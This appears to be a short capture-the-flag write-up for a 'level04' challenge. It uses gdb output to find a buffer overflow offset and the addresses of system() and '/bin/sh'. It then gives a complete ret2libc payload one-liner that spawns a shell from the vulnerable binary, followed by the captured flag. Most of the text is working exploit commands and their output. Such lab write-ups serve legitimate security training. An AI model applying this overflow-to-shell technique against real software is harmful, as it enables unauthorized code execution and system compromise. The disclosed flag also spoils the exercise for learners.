To follow child : in gdb `set follow-fork-mode child`

```C
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2494]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2494]
0x41326641 in ?? ()
```

first we need to set a breakpoint at main, then run :
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

to find the string "/bin/sh" we can use `info proc mappings` and then :

```
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

payload = [156bytes padding] + [addr of system()] + [4bytes padding] + [addr of "/bin/sh"]

```
(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```

flag = `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`